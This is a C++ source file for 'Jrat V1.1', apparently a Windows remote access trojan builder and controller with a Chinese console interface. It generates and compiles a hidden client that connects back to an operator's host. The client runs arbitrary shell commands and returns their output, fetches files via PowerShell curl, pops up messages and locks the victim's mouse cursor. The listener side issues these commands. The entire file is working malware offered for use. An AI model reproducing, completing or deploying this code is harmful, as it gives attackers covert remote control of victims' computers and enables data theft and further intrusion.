#include <iostream>
#include<bits/stdc++.h>
#include <winsock2.h>
#include <windows.h>
#include<fstream>
#pragma comment(lib, "ws2_32.lib")
using namespace std;
void SetColorAndBackground(int ForgC, int BackC) {
	WORD wColor = ((BackC & 0x0F) << 4) + (ForgC & 0x0F);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), wColor);
}
void Welcome(){
	srand(unsigned(time(0)));   //获取系统时间 
	int number=rand()%6;//将随机数赋给number 
	if(number==0){
		SetColorAndBackground(12,0);
		cout<<R"(                                                                                                                                                     
                                                                                                                   
                                                                                                                                                      
                                                                                                                                                      
       01111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110      
       01111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       11111111111000011111111111111111111111111111111111111111111111111111000111111111111100011111110000001111111111111111111100000011111111111      
       11111111110   101111111111111111111111111111111111000111111111111101   0111111111110    01100111   1011111111111111110011    011111111111      
       11111111110   1011111111111111111111111111111111101  011111111111110    011111111101   0010        101111111111111101        001111111111      
       11111111110   101111111111111111111111111111111100   0111111111111101   00111111110   10111  110   101111111111111101  110   011111111111      
       11111111110   101110000000111011000111110001110101   0000011111111110    0111111101   0111000000   10111111111111111000000   001111111111      
       11111111110   101101   0     010          10111          0111111111110   101111100   00111111110   10111111111111111111110   011111111111      
       11111111110   101101      11 010   11111   1010111   111101111111111101   0011110   101111111110   10111111111111111111110   001111111111      
       11111111110   101101    00000110100000000   011000   000011111111111110    011101   011111111110   10111111111111111111110   001111111111      
       11111111110   101101   00111111100011111    011100   0111111111111111100   10110   0011111111110   10111111111111111111110   001111111111      
       11111111110   101101   0111111001           011100   01111111111111111101   010   10111111111110   10111111111111111111110   011111111111      
       11111111110   101101   01111110    100000   011100   01111111111111111110   100   01111111111110   10111111111111111111110   001111111111      
       11111111100   011101   0111110   10011101   011100   011111111111111111100   0   001111111111110   10111111110001111111110   001111111111      
       1111010001   1011101   01111101   000001    011110   0000111111111111111101      011111111000000   10000011101 10111000000   000000111111      
       11110       10111101   01111110         1   011110       011111111111111110     00111111110              010    01101             1011111      
       11110     1001111110  101111111011    10011 01111101     0111111111111111100 1 001111111110     111     10101  101111     111     1011111      
       11111000000111111111000111111111100000011000111111100000011111111111111111110000111111111110000000000000111110001111100000000000001111111      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111      
       00111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      )"<<endl;
		SetColorAndBackground(7,0);
	}
	else if(number==1){
		SetColorAndBackground(10,0);
		cout<<R"(                                                                                                                                                                                                                                                                                                  
                 @B@,                                                                                iuO@@1                     .7SBB@.               
                 B@B:                                      v81                                   L@B@B@B@Bj                  B@@@B@B@B                
                 @B@.                                     2@@M                                   5B8v. SB@v                  @BX;  @B@                
                 B@B.                                     rB@U                                         F@Bv                        B@B                
                 @B@.     8@@. jB@B@    vBB@B@B@Bj     EB@B@B@@@B@.          JB@B          @B@.        NB@7                        @B@                
                 B@B.     @@@;@B@M@B   B@B@1L7jB@B@.   U@8@B@B8B@B.           @B@L        @B@k         N@BL                        @@B                
                 @@@.     B@B@B        7,       :@B@      i@@u                 @B@       iB@B          0B@v                        @B@                
                 B@B.     @B@B                   B@B      vB@S                 u@@M      @@B           N@@L                        @@B                
                 @B@.     B@Br           rX@B@B@@@B@      L@@P                  B@B,    E@Bi           EB@7                        @B@                
                 B@B.     @B@:         B@B@BMXJi.B@@      YB@k                   B@@   .@BZ            P@Bv                        @@B                
                 @B@      B@Bi        B@B:       @B@      L@Bk                   uB@Y  @B@             NB@7                        @B@                
                uB@B      @B@i       i@B@       rB@B      uB@S                    @@@ rB@.             5@Br                        B@B                
          ,.   kB@@       B@B;        @@B7     MB@B@      :@B@                     @BqB@U         ..   E@@Y   ..    :MB5      .    @B@.   ..          
          MB@B@B@0        @B@v        :B@B@B@B@B B@@       0@B@B@@:                1@@@B         J@@@@@@@@@B@B@B:   @B@Bi    B@B@B@B@B@B@B@B          
          .SNqui          :r;.          .LX8PL   ii7         71EkY                  iii          .7ri;ii:i:;irrv     2Si     :rriiii::iiirrr          
                                                                                                                                                                                                      
                                                                                                      B@B                                        P8v  
   5@B@@@B@@@BE:                                  @B@B@B@@@B@k:                                       @B@         .@@@                          @B@B: 
   5B@B1Xq0MB@B@B,                                B@B@2qPZM@@@B@                                      B@B          @B@                           uk;  
   j@BS       G@@B                                M@@:       B@B@                                     @B@          B@B                                
   uB@N        @B@                                O@B7       :@@B                                     B@B          @B@                                
   Y@BN       7B@B   :@B@.         B@BL  B@B@     O@@r       P@BX      :GB@B@B@B@F          XB@B@@@B: @B@          B@B     :@B@        ,@@@     iB@B  
   u@@k      XB@F     0@B@        r@B@   @B@@     8@@r     ,O@@L       @B@1r:,iGB@B.      P@B@Z7:iY@@@B@B          @B@     iB@B        ,B@B     i@B@  
   j@B@B@B@B@B0        B@B7       @B@             OB@@@B@B@B@j         :        :B@B     B@BM        B@B@          B@@     :@B@        .@B@     :B@@  
   jB@BkEOMB@@B@@r      B@B      MB@:             8@BBXG8MM@B@BM,                @@@    r@B@         .B@@          @B@     :B@B        .B@@     :@B@  
   J@@S       .B@BM     vB@Z    :B@q              OB@:       :@B@u      ,U@B@B@B@@@B    @B@r          @@@          B@B     :@B@        .@B@     :B@B  
   uB@0         B@@i     @B@.   B@B               O@B7        .@B@    i@@@B8U7:  @B@    B@Bi          B@B          @B@     :@@B        .B@@     :@@@  
   J@BG         @B@r      @@@  X@B.               OB@7         B@@.  .@B@        @@B    M@@5         .@@@         ,B@B     ,@B@        .@B@     :B@B  
   uB@k        XB@B       i@Bi @B2                8@Bi        M@B@   jB@E       q@B@    ,@@@.        @B@B         B@@J      B@B        @@@@     :@B@  
   U@BB.::i;JO@B@B         G@@@B@        1@B1     MB@k,:iirjB@@BB    .@B@L    rB@B@B     Y@B@k.   .S@@@B@   7:  iB@BM       qB@B7    v@B@B@     iB@B  
   0@@B@B@@@B@BO:           B@B@         @@@B     B@B@B@B@B@B@q.      :@@@B@B@BP @B@      .@@@B@B@B@7 @@@   B@B@B@B7         jB@B@B@B@L.B@B     r@@@  
    , ......                PB@r          v7      .........              iLuL:   ...         ,7Jur.   ..,   ,7Jvi              .rLu7,   ,..      ,..  
                           rB@M                                                                                                                       
                          :B@B                                                                                                                        
                      ES5@B@B                                                                                                                         
                      @B@B@i                                                                                                                          
					  
					  
					  )"<<endl;
		SetColorAndBackground(7,0);
	}
	else if(number==2){
		SetColorAndBackground(11,0);
		cout<<R"(                                                                                                                                                     
                                                                                                                   
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                             
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
   X0.     ZZ     iW,          .M8                                                                             .0;                                  
   iMM    rMMi    MM            M0                                                     .M,                     iMZ                   MM            
    MM    M@MM   ;MX   ,ZW0S    MZ    70WWa    ZBW8r    S; ZB8  i0WZ      2BB2        2MMWZX   70WBa           :MS  ia SW7 :aBB0i  ;aMMa8          
     MB  rM :Mi  MM   0M2:iMM   MZ  :MMZX2B  0MWS7ZMM   MM0XXMMM@7XMM,  2M8:iBM;      SBM0ar .MMZ7SMMS         ,MX  BMM08; 88i,SM8 :SMMXZ         
     @M  MM  MM  MX  7M0,i:7MM  MZ  MM      rM7     MM  MM    MM    MZ .MM,i:iMM       :M,   MM     BM         ,MS  ZMr      i;rMM   MM             
      MX.M.  7M WM   ZM2SaaSX;  MZ  MZ      ZM      MM  MM    M0    MZ ;M0X2a2XX       rM:   M@     SM:        .MX  ZM    :MMaX.MM   MM             
      BMMM    MMMS   ,M@        M0  MMr   :  MM.   BM;  MM    MM   .M8  MM             ;M2   0MS   iMM         MM   0M    @M   ,MM   MM              
       MM.    rMM     ,MMMMMM   Ma   2MMMMM   WMMMMM:   MM    M0   .M2   WMMMMM,        WMMZ  XMMMMMa       BMMM,   ZM.   .@MMMaMM   ;MMM.      oo   
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      )"<<endl;
		SetColorAndBackground(7,0);
	}
	else if(number==3){
		SetColorAndBackground(14,0);
		cout<<R"(                                                                                                                                                     
                                                                                                                                                              
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
   irri.irrs  p.                                     .pr                                                                                              
   rosoppsnn .pi                                      r.                                                                                              
       pi    .p. sTi     .rns.   .. rn   isTi         .    isns        i .sni     .sssi          isns   i  snr      isss.     .sTTi    .. iTs.        
       pr     pprirpp   hpi.ipo  pphTs  po..np.      .pr  pp..n.      ippsispp   ppsirppi       pp..n. .ppnirhpr  ipprispp   ppsirpp.  pporihpr       
       pr    .ps   .p. spr...pp  pp    pp....pp      .pi  pp.         .pi   ip  op     pp      .pp.     ps    op  pn     pr ep     pp  pp    pp       
       pr    .p.   .p. ep.iii.i  pp    pp.iii..      .pi   .opp.      .p.   ip. pp     sp        .opp.  p.    sp  pi     pn pp     Tp  pp    pp       
       ps    .pr   .pi .po       pp    Tp.   .       .pr  .   pp      ip.   ip. .ph.  ips      ..   pp  pp.  rpo  ppi  .pp  .pe   ips  pp    pp  ..   
       pi     p.   .p.   oppppi  sh     ippppe        p. .ppphr       .p.   .p.   opppp.       .ppphr   prspppi    ipppps     oppph.   sh    ne  ..   
                                                                                                       .pi                                            
                                                                                                       .pi                                            
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      )"<<endl;
		SetColorAndBackground(7,0);
	}
	else if(number==4){
		SetColorAndBackground(13,0);
		cout<<R"(                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                       ..                                                                                             
             pe.        ueu        ueu                uWW                                                                                             
             WWW        WWW.       WWu                .WW                                                                                             
              WWu      kWWWW      uWW                 .WW                                                                                             
              kWW      WW WW.     WWu    .ukWWWu.     .WW     .ue.     .pWWk.             .u.      .uu    uu. .uWWpu                                  
               WW.    pWu uWW    uWW    .WWWuueWWW    .WW    WWWu    uWWpuuWWW.           WWp      pWW    WWppWWueWWWe                                
               eWW    WW   WW.   WWu            WWu   .WW  uWWu     pWk      WW.          WWe      uWW    WWWu      WWu                               
                WW.  pWu   eWW  .WW        .uuuuWWu   .WW pWu      .WW.......WWW          WWu      uWW    WWk       uWW                               
                uWW  WW     WW  WWu     .WWWWpu.WWu   .WWWWW       .WWpWWWWWWpWu          WWu      uWW    WWu       .WW                               
                 WW uWu     eWu WW     .WW      WWu   .WW .WWu     .WW                    WWe      eWW    WWe       pWW                               
                 uWWWW       WWWWu     uWW     eWWu   .WW   pWW.    pWW       .           uWW.    uWWW    WWWu     uWW.   ..    ...    ..             
                  WWWu       pWWW       pWWWWWWuWWe   uWW    .WWW.   uWWWWWWWWW            eWWWWWWkkWW    WWekWWWWWWW     WWW   WWW   WWW.            
                  ...         ...         .uu.  ...    ..      ...     .uuuu.                .uuu   ..    WWu  uuu.       .u.   .u.   .u.             
                                                                                                          WWu                                         
                                                                                                          WWk                                         
                                                                                                          pWu                                         
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      )"<<endl;
		SetColorAndBackground(7,0);
	}
	else{
		SetColorAndBackground(13,0);
		cout<<R"(                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
  0    11                                                  00             0      10              101          10                                      
  00  00                                                  00                     10              01           10                                      
   0110   00100  10   0      11101  000  01101     11101 1001 0001 11101  0  101100      00100  0011     0010 101100  11100  001001  001101  01101    
    00   00   10 00   0       1100  0   001100      1110  00  00    1100  0  0   10     00   00  0      01    10   01  1110  01  00 00   01 001100    
    00   00   10 10   0     00  00 10   00        10  10  00  01  10  00  0  0   10     00   00  0      01    10   01 01 10  01  10 00   01 00        
    00    10000   00110     101100  0    00101     01110  00  01   01100  0  100100      00000   0       0000 10   0  00110  01  10  001101  00111 00 
                                                                                                                                        10            
                                                                                                                                     0111             
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      )"<<endl;
		SetColorAndBackground(7,0);
	}
}
char CmdResult[114514];
HWND hwnd = GetForegroundWindow();
int port;
string word,lhost,lport;
string getCmdResult(string strCmd)  {
    char buf[2048] = {0};
    FILE *pf = NULL;
    if((pf=popen(strCmd.c_str(),"r"))==NULL){
        return "";
    }
    string strResult;
    while(fgets(buf,sizeof buf,pf)){
        strResult+=buf;
    }
    pclose(pf);
    unsigned int iSize= strResult.size();
    if(iSize>0&&strResult[iSize-1]=='\n'){  // linux
        strResult = strResult.substr(0, iSize - 1);
    }
    return strResult;
}
void writeclient(){
	ofstream ofile;
	ofile.open("C:\\Windows\\Client.cpp");
	ofile<<R"(#include <iostream>)"<<endl;
	ofile<<R"(#include <fstream>)"<<endl;
	ofile<<R"(#include <winsock2.h>)"<<endl;
	ofile<<R"(#include <windows.h>)"<<endl;
	ofile<<R"(#pragma comment(lib, "ws2_32.lib"))"<<endl;
	ofile<<R"(#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ))"<<endl;
	ofile<<R"(using namespace std;)"<<endl;
	ofile<<R"(string strCmd;)"<<endl;
	ofile<<R"(int lockmouse(bool lockb) {)"<<endl;
	ofile<<R"(	RECT rect = {};)"<<endl;
	ofile<<R"(	rect.bottom = 1;)"<<endl;
	ofile<<R"(	rect.right = 1;)"<<endl;
	ofile<<R"(	if (lockb) return ClipCursor(&rect);)"<<endl;
	ofile<<R"(	else return ClipCursor(NULL);)"<<endl;
	ofile<<R"(})"<<endl;
	ofile<<R"(void HideWindow() {)"<<endl;
	ofile<<R"(	HWND hwnd = GetForegroundWindow();)"<<endl;
	ofile<<R"(	if (hwnd) {)"<<endl;
	ofile<<R"(		ShowWindow(hwnd, SW_HIDE);)"<<endl;
	ofile<<R"(	})"<<endl;
	ofile<<R"(})"<<endl;
	ofile<<R"(string getCmdResult(const string &strCmd)  {)"<<endl;
	ofile<<R"(    char buf[2048] = {0};)"<<endl;
	ofile<<R"(    FILE *pf = NULL;)"<<endl;
	ofile<<R"(    if((pf=popen(strCmd.c_str(),"r"))==NULL){)"<<endl;
	ofile<<R"(        return "";)"<<endl;
	ofile<<R"(    })"<<endl;
	ofile<<R"(    string strResult;)"<<endl;
	ofile<<R"(    while(fgets(buf,sizeof buf,pf)){)"<<endl;
	ofile<<R"(        strResult+=buf;)"<<endl;
	ofile<<R"(    })"<<endl;
	ofile<<R"(    pclose(pf);)"<<endl;
	ofile<<R"(    unsigned int iSize= strResult.size();)"<<endl;
	ofile<<R"(    if(iSize>0&&strResult[iSize-1]=='\n'){  // linux)"<<endl;
	ofile<<R"(        strResult = strResult.substr(0, iSize - 1);)"<<endl;
	ofile<<R"(    })"<<endl;
	ofile<<R"(    return strResult;)"<<endl;
	ofile<<R"(})"<<endl;
	ofile<<R"(string CheckIP() {)"<<endl;
	ofile<<R"(	WSADATA wsaData;)"<<endl;
	ofile<<R"(	char name[255];)"<<endl;
	ofile<<R"(	char* ip;)"<<endl;
	ofile<<R"(	PHOSTENT hostinfo;)"<<endl;
	ofile<<R"(	string ipStr;)"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	if (!WSAStartup(MAKEWORD(2, 0), &wsaData)) {)"<<endl;
	ofile<<R"(		if (!gethostname(name, sizeof(name))) {)"<<endl;
	ofile<<R"(			if ((hostinfo = gethostbyname(name)) != NULL) {)"<<endl;
	ofile<<R"(				ip = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);)"<<endl;
	ofile<<R"(				ipStr = ip;)"<<endl;
	ofile<<R"(			})"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		WSACleanup();)"<<endl;
	ofile<<R"(	})"<<endl;
	ofile<<R"(	return ipStr;)"<<endl;
	ofile<<R"(})"<<endl;
	ofile<<R"(int main() {)"<<endl;
	ofile<<R"(	HideWindow();)"<<endl;
	ofile<<R"(	WSADATA wsdata;)"<<endl;
	ofile<<R"(	WSAStartup(MAKEWORD(2, 2), &wsdata);)"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	SOCKET hSock = socket(PF_INET, SOCK_STREAM, 0);)"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	SOCKADDR_IN servAddr;)"<<endl;
	ofile<<R"(	servAddr.sin_family = AF_INET;)"<<endl;
	ofile<<R"(  servAddr.sin_addr.s_addr = inet_addr(")"<<lhost<<R"(");)"<<endl;
	ofile<<R"(  servAddr.sin_port = htons()"<<lport<<R"();)"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	connect(hSock, (SOCKADDR*)&servAddr, sizeof(servAddr));)"<<endl;
	ofile<<R"(	send(hSock, CheckIP().c_str(), 2048, 0);)"<<endl;
	ofile<<R"(	send(hSock, CheckIP().c_str(), 2048, 0);)"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	int x;)"<<endl;
	ofile<<R"(	bool b = true;)"<<endl;
	ofile<<R"(	string str;)"<<endl;
	ofile<<R"(	char s[2048] = {};)"<<endl;
	ofile<<R"(	while (true) {)"<<endl;
	ofile<<R"(		)"<<endl;
	ofile<<R"(		recv(hSock, s, 2048, 0);)"<<endl;
	ofile<<R"(		cout<<s;)"<<endl;
	ofile<<R"(		str=s;)"<<endl;
	ofile<<R"(		if(str=="quit"){)"<<endl;
	ofile<<R"(			return 0;)"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		if(str=="shell"){)"<<endl;
	ofile<<R"(			char Cmd[114514]={};)"<<endl;
	ofile<<R"(			recv(hSock,Cmd , 2048, 0);)"<<endl;
	ofile<<R"(			strCmd=Cmd;)"<<endl;
	ofile<<R"(			send(hSock, getCmdResult(strCmd).c_str(),2048, 0);)"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		if(str=="msgbox"){)"<<endl;
	ofile<<R"(			char* msgbox;)"<<endl;
	ofile<<R"(			recv(hSock,msgbox,2048,0);)"<<endl;
	ofile<<R"(			system(msgbox);)"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		if(str=="clip"){)"<<endl;
	ofile<<R"(			char clip[114514];)"<<endl;
	ofile<<R"(			recv(hSock,clip , 2048, 0);)"<<endl;
	ofile<<R"(			string lockmous=clip;)"<<endl;
	ofile<<R"(			if(lockmous=="true")lockmouse(true);)"<<endl;
	ofile<<R"(			if(lockmous=="false")lockmouse(false);)"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		if(str=="download"){)"<<endl;
	ofile<<R"(			char download[114514];)"<<endl;
	ofile<<R"(			recv(hSock,download,2048,0);)"<<endl;
	ofile<<R"(			system(download);)"<<endl;
	ofile<<R"(		})"<<endl;
	ofile<<R"(		send(hSock, CheckIP().c_str(), 2048, 0);)"<<endl;
	ofile<<R"(		)"<<endl;
	ofile<<R"(	})"<<endl;
	ofile<<R"( )"<<endl;
	ofile<<R"(	WSACleanup();)"<<endl;
	ofile<<R"(	return 0;)"<<endl;
	ofile<<R"(})"<<endl;
	ofile.close();
	cout<<"\n正在生成Client.exe ...\n";
	if(getCmdResult("g++.exe C:\\Windows\\Client.cpp -o .\\Client.exe -std=c++11 -static-libgcc -l wsock32 -s -w").empty()==true)cout<<"Client.exe生成成功！\n\n";
	Sleep(1500);
	system("del C:\\Windows\\Client.cpp");
}
void Jrat1(){
	ShowWindow(hwnd,SW_MAXIMIZE);
	Welcome();
	cout<<"欢迎使用Jrat！当前版本1.1！\n\n";
	SetConsoleTitle("Jrat V1.1");
	while(true){
		cout<<"Jrat>> ";
		cin>>word;
		if(word=="lhost"){
			cin>>lhost;
			cout<<"设置成功！\n";
		}
		else if(word=="lport"){
			cin>>lport;
			cout<<"设置成功！\n";
		}
		else if(word=="port"){
			cin>>port;
			cout<<"设置成功！\n";
		}
		else if(word=="save"){
			if(lport.size()!=0 && lhost.size()!=0){
				writeclient();
			}
			else cout<<"上线信息不完整，无法生成！\n";
		}
		else if(word=="run"){
			if(port==0)cout<<"请输入监听端口！\n";
			else break;
		}
		else cout<<"不存在此命令！\n";
	}
}
void Jrat2(){
	WSADATA wsdata;
	WSAStartup(MAKEWORD(2, 2), &wsdata);
	SOCKET hServSock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAddr.sin_port = htons(port);
	bind(hServSock, (SOCKADDR*)&servAddr, sizeof(servAddr));
	listen(hServSock, 5);
	SOCKADDR_IN clntAddr;
	int clntAddrSz = sizeof(clntAddr);
	SOCKET hSock;
	int x;
	string s;
	while (true) {
		cout << "正在等待连接..." << endl;
		hSock = accept(hServSock, (SOCKADDR*)&clntAddr, &clntAddrSz);
		char IP[2048] = {};
		char Check[2048] = {};
		recv(hSock, IP, 2048, 0);
		system("cls");
		while (recv(hSock, Check, 2048, 0) != -1) {
			cout<<"Command>> ";
			cin>>s;
			send(hSock, s.c_str(), 2048, 0);
			if(s=="cls"){
				system("cls");
				continue;
			}else if(s=="shell"){
				string command;
				//getchar();
				getline(cin,command);
				send(hSock, command.c_str(), 2048, 0);
				recv(hSock,CmdResult,2048,0);
				cout<<endl<<CmdResult<<endl<<endl;
			}else if(s=="quit"){
				send(hSock, s.c_str(), 2048, 0);
				recv(hSock,CmdResult,2048,0);
				break;
			}else if(s=="msgbox"){ 
				string msg;
				//getchar();
				getline(cin,msg);
				msg="msg * "+msg;
				send(hSock,msg.c_str() , 2048, 0);
			}else if(s=="clip"){
				string clip;
				cin>>clip;
				send(hSock, clip.c_str(), 2048, 0);
			}else if(s=="download"){
				cout<<endl<<"输入下载地址：";
				string dlink;
				cin>>dlink;
				cout<<"输入文件名：";
				string name;
				cin>>name;
				string coma="powershell curl -o '"+name+"' '"+dlink+"'";
				send(hSock, coma.c_str(), 2048, 0);
			}else cout<<"\nJrat目前没有此命令！"<<endl;
		}
		closesocket(hSock);
		cout << "对方已下线！" << endl;
		Sleep(2000);
		system("cls");
	}
}
int main() {
	Jrat1();
	Jrat2();
	return 0;
}
